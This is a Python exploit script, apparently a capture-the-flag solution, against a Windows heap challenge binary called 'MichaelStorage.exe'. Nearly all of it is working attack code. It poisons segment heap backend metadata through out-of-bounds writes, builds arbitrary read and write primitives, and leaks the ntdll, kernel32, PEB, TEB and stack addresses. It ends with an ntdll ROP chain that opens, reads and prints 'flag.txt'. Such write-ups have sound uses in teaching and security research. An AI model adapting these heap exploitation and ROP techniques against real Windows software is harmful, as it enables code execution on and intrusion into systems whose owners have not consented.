import os, ctypes
from pwintools import *

binary = PE('MichaelStorage.exe')
ntdll = PE('../../dlls/System32/ntdll.dll', pdb='../../dlls/System32/ntdll.pdb')
kernel32 = PE('../../dlls/System32/kernel32.dll')

os.environ["_NO_DEBUG_HEAP"] = "1"

DEBUG = False
if DEBUG:
    p = Process('MichaelStorage.exe')
else:
    p = Remote('localhost', 12345)
    p.timeout = 5000

def start_debug():
    if DEBUG:
        p.timeout = 10000000
        p.spawn_debugger(x96dbg = True, sleep = 3)

def menu(sel):
    p.recvuntil('Your choice: ')
    p.sendline(str(sel))

def alloc(_type, size):
    menu(1)
    p.recvuntil('Type of storage:')
    p.sendline(str(_type))
    p.recvuntil('Size:')
    p.sendline(str(size))
    p.recvuntil('done !')

def setv(_type, store_idx, index=None, data=None):
    menu(2)
    p.recvuntil('Storage index:')
    p.sendline(str(store_idx))
    if _type in [0, 1]:  # int32 array
        assert isinstance(data, (int, long))
        p.recvuntil('Index:')
        p.sendline(str(index))
        p.recvuntil('Value:')
        p.sendline(str(data))
    elif _type == 2:
        assert isinstance(data, (str, bytes, bytearray))
        p.recvuntil('Index:')
        p.sendline(str(index))
        p.recvuntil('Value:')
        p.send(data)
    elif _type == 3:
        assert isinstance(data, (str, bytes, bytearray))
        p.recvuntil('Size:')
        p.sendline(str(len(data)))
        p.recvuntil('Value:')
        p.send(data)
    else:
        assert False

def getv(store_idx):
    menu(3)
    p.recvuntil('Storage index:')
    p.sendline(str(store_idx))
    p.recvuntil('Value:')
    return p.recvuntil('\r\n*****************************', drop=True)

def destroy(store_idx):
    menu(4)
    p.recvuntil('Storage index:')
    p.sendline(str(store_idx))

MASK64 = (1 << 64) - 1
MASK32 = (1 << 32) - 1

def signed64(val):
    return ctypes.c_longlong(val & MASK64).value

def signed32(val):
    return ctypes.c_int(val & MASK32).value

def forceneg(val):
    return signed64(val | (1 << 63))

# hHeap offset: MichaelStorage.0+0x5630

log.info('init alloc')

alloc(1, 1)       # 0, 00000239cad02050
alloc(2, 0x20000) # 1, 00000239cad13010
alloc(3, 0x20000) # 2, 00000239cad03080 (00000239CAD34010)

# st_lst offset: MichaelStorage.0+5640

log.info('poison backend')

def RELW(addr, val):
    setv(1, 0, forceneg((addr - 0x02058) // 8), signed64(val))

PAGECNT = 0x42
RELW(0x00278, u64('\x03\x01\x00\x00' + p16(~PAGECNT & 0xffff) + '\x04' + chr(PAGECNT)))
RELW(0x00680, 0)
for i in range(0x21, PAGECNT):
    RELW(0x00278 + 0x20*i, u64('\x01\x01\x00\x00' + p32(i)[::-1]))

log.info('get overlap')

destroy(1)

alloc(0, 0x1f000 // 4)  # 1
alloc(0, (0xef50 - 0x10) // 4)  # 3

alloc(2, 0x2010 - 0xa0)  # 4, 0x32080 ~ 0x33ff0
alloc(2, 0x10)  # 5
alloc(2, 0x10)  # 6
alloc(2, 0x10)  # 7
alloc(3, 0x10000)  # 8, ptr @ 0x340e8
destroy(7)
destroy(5)

log.info('let the leaking begin!')

seg_base = u64(getv(2).ljust(8, '\x00')) - 0x44118
assert seg_base & 0xfffff == 0
log.success('_HEAP_PAGE_SEGMENT: {:016x}'.format(seg_base))

def AAR_unsafe(addr):
    RELW(0x340e8, addr)
    return u64(getv(8)[:8].ljust(8, '\x00'))

def AAR(addr):
    val = 0
    for i in reversed(range(8)):
        val = (val << 8) | (AAR_unsafe(addr + i) & 0xff)
    return val

def AAW(addr, data):
    RELW(0x340e8, addr)
    setv(3, 8, data=data)

heap_base = AAR(seg_base) - 0x148
assert heap_base & 0xffff == 0
log.success('_SEGMENT_HEAP: {:016x}'.format(heap_base))

diff = AAR(heap_base + 0x370) - 0x120780
assert diff & 0xffff in range(0, 0xEE8-0x780)
ntdll.base = diff & (MASK64 - 0xffff)
log.success('ntdll: {:016x}'.format(ntdll.base))

peb = AAR(ntdll.base + ntdll.symbols['TlsExpansionBitMap'] + 8) - 0x240
assert peb & 0xfff == 0
log.success('PEB: {:016x}'.format(peb))

teb = peb + 0x1000
log.info('TEB: {:016x}'.format(teb))

stackbase = AAR(teb + 0x8)
stacklimit = AAR(teb + 0x10)
assert stackbase & 0xffff == 0 and stacklimit & 0xfff == 0
log.success('StackBase:  {:016X}'.format(stackbase))
log.success('StackLimit: {:016X}'.format(stacklimit))

pattern = ntdll.base + ntdll.symbols['RtlUserThreadStart'] + 0x21
probe, cnt = stackbase - 0x78, 0
while stackbase - probe < 0x1000:
    log.info('Probe #{} @ {:016X}'.format(cnt, probe))
    if [AAR_unsafe, AAR][int('\0' in p64(pattern)[:6])](probe) == pattern:
        log.success('Probing success!')
        break
    probe -= 8
    cnt += 1
else:
    log.error('Probing failed...')
    exit()

ret2main = probe - 8 * 22
log.info('Stack addr returning to main: {:016X}'.format(ret2main))

kernel32.base = AAR(probe - 8 * 6) - (kernel32.symbols['BaseThreadInitThunk'] + 0x14)
assert kernel32.base & 0xffff == 0
log.success('kernel32: {:016x}'.format(kernel32.base))
binary.base = AAR(ret2main) - 0x209c
assert binary.base & 0xffff == 0
log.success('MichaelStorage: {:016x}'.format(binary.base))

rop_start = ret2main + 8 * 6
log.info('ROP start addr: {:016X}'.format(rop_start))

"""
ntdll gadgets
0x01029 : ret
0x8df3f : pop rcx ; ret
0x8ef41 : xor r8d, r8d ; mov eax, r8d ; ret
0x8b8f1 : pop rcx ; pop r8 ; pop r9 ; pop r10 ; pop r11 ; ret
0x8b8f2 : pop r8 ; pop r9 ; pop r10 ; pop r11 ; ret
0x8b8f7 : pop rdx ; pop r11 ; ret
0x78b23 : mov qword ptr [rcx], rax ; ret
0x8016b : xchg eax, ecx ; ret
"""

n = ntdll.base
k = kernel32.base
ret = n + 0x01029
pop_rcx = n + 0x8df3f
xor_r8 = n + 0x8ef41
pop_rcx_r8_r9_r10_r11 = n + 0x8b8f1
pop_r8_r9_r10_r11 = n + 0x8b8f2
pop_rdx_r11 = n + 0x8b8f7
mov_drcx_rax = n + 0x78b23
xchg_eax_ecx = n + 0x8016b  # HANDLE is void*, but HFILE & GetStdHandle() results are int :)
OpenFile = k + kernel32.symbols['OpenFile']
ReadFile = k + kernel32.symbols['ReadFile']
WriteFile = k + kernel32.symbols['WriteFile']
GetStdHandle = k + kernel32.symbols['GetStdHandle']
Sleep = k + kernel32.symbols['Sleep']
flag = binary.base + 0x5850
scratch = binary.base + 0x5950
bytes_count = binary.base + 0x5b50

payload = ''.join(map(p64, [
    pop_rcx,             # aligned by 0x8
    rop_start + 54 * 8,  # aligned by 0x10
    pop_rdx_r11,
    scratch,
    0,
    xor_r8,
    ret,
    OpenFile,
    pop_rcx_r8_r9_r10_r11,
    0,
    0,
    0,
    0,
    0,
    xchg_eax_ecx,
    pop_rdx_r11,
    flag,
    0,
    pop_r8_r9_r10_r11,
    0x100,
    bytes_count,
    0,
    0,
    ReadFile,
    pop_rcx_r8_r9_r10_r11,
    0,
    0,
    0,
    0,
    0,
    ret,
    pop_rcx,
    (-11 & 0xffffffff),
    GetStdHandle,
    xchg_eax_ecx,
    pop_rdx_r11,
    flag,
    0,
    pop_r8_r9_r10_r11,
    0x100,
    bytes_count,
    0,
    0,
    WriteFile,
    pop_rcx_r8_r9_r10_r11,
    0,
    0,
    0,
    0,
    0,
    ret,
    pop_rcx,
    0xffffffff,
    Sleep,
    u64('flag.txt'),
    0
]))

if rop_start + len(payload) > stackbase:
    log.error('Not enough remaining space for ROP!')
    exit()

log.info('Writing ROP gadgets...')
AAW(rop_start, payload)

log.info('Triggering ROP...')
AAW(ret2main, p64(pop_rcx_r8_r9_r10_r11))

p.interactive()
